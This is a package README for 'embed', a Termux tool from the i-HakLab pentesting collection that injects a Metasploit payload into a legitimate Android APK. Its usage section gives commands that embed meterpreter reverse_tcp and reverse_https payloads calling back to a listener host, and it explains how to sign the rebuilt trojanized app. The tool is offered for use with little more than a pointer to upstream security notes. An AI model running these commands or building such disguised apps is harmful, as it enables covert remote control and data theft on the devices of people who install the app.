# embed

> Open source tool to embed a Metasploit payload into a legitimate APK file.

## Overview

This package provides `embed` for Termux. It is maintained as part of the i-HakLab package collection.

## Upstream source

- **Source:** [https://github.com/ivam3/embed](https://github.com/ivam3/embed)

## Installation

```bash
pkg update
pkg install embed
```

## Requirements

ruby, git, wget, curl, which, axel, tar, aapt, apksigner, openjdk-21, apktool, xml2axml

## Usage

```bash
embed app.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444
embed app.apk -p android/meterpreter/reverse_https LHOST=example.com LPORT=8443
```

The final APK is written as `<target>_final.apk`. The launcher asks how to sign
the rebuilt APK: use the Android debug key, an existing keystore or a new
keystore. See the [project README](https://github.com/ivam3/embed) for the full
workflow and security notes.

## Package details

| Field | Value |
|---|---|
| Package | `embed` |
| Version | `3.0.2` |
| Architecture | `all` |
| Maintainer | Ivam3 <https://t.me/Ivam3_Bot> |
| Source | [https://github.com/ivam3/embed](https://github.com/ivam3/embed) |
| Dependencies | ruby, git, wget, curl, which, axel, tar, aapt, apksigner, openjdk-21, apktool, xml2axml |
| Suggests | metasploit-framework |

## Troubleshooting

```bash
pkg update
pkg install embed
```

Verify that the command is available with `command -v embed`. If the package was recently installed, open a new shell so the updated `PATH` is loaded.

## License

See the upstream source for the license terms that apply to this package and its bundled sources.

## Part of i-HakLab

This package is part of the [i-HakLab](https://github.com/Ivam3/i-HakLab) ecosystem, a cybersecurity and pentesting toolkit for Android/Termux.

```bash
pkg install i-haklab
```
